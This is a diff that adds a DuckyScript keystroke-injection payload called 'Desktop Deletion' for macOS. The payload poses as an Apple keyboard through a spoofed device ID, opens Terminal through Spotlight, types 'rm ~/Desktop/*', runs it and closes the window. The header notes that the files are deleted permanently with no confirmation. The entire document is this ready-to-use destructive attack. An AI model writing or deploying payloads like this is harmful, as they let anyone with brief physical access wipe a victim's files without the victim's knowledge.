@@ -1,0 +1,24 @@
+REM Title: Desktop Deletion
+REM Author: NARSTY
+REM Description: Opens Terminal and enters commands to delete files located on Desktop  
+REM Please exercise caution when using this command
+REM It will permanently delete all files on the desktop without any confirmation prompts
+REM Target: MacOS 
+REM Version: 1.0
+REM Category: Execution
+
+
+ID 05ac:021e Apple:Keyboard
+DELAY 300
+GUI SPACE
+DELAY 500
+STRING terminal.app 
+DELAY 1000
+ENTER
+DELAY 1000
+STRING rm ~/Desktop/*
+DELAY 2000
+ENTER
+DELAY 2000
+GUI W
+
